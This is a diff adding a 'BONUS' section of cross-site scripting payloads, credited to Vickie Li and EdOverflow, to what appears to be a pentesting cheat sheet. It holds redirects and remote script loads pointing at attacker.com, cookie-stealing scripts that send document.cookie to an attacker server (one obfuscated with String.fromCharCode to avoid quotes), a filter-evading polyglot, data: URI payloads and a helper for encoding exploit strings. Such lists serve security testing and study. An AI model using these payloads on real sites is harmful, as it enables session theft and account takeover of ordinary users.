@@ -526,3 +526,53 @@ the payload to add after productid in url if everything fails:
 
 &storeId="></select><img%20src=1%20onerror=alert(1)>
 
+
+## BONUS: XSS payloads from Vickie Li and EdOverflow
+
+<script>location="http://attacker.com";</script>
+
+<script src=http://attacker.com/xss.js></script>
+
+<script>image = new Image();
+image.src='http://attacker_server_ip/?c='+document.cookie;</script>
+
+<img onload=alert('The image has been loaded!') src="example.png">
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"
+
+data:text/html,<script>alert('XSS by Vickie')</script>
+
+"/><script>location="http://attacker.com";</script>
+
+<img src=""/><script>location="http://attacker.com";</script>">
+
+```html
+javascript:"/*\"/*`/*' /*</template>
+</textarea></noembed></noscript></title>
+</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+```
+
+you can construct an XSS payload without quotes, like this:
+```html
+<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
+47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
+101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
+```
+
+which is equivalent to
+```html
+<scrIPT>location="http://attacker_server_ip/?c="+document.cookie;</scrIPT>
+```
+
+You can use this piece of code to translate your
+exploit string to an ASCII number sequence:
+```html
+<script>
+function ascii(c){
+    return c.charCodeAt();
+}
+encoded = "INPUT_STRING".split("").map(ascii);
+document.write(encoded);
+</script>
+```
+
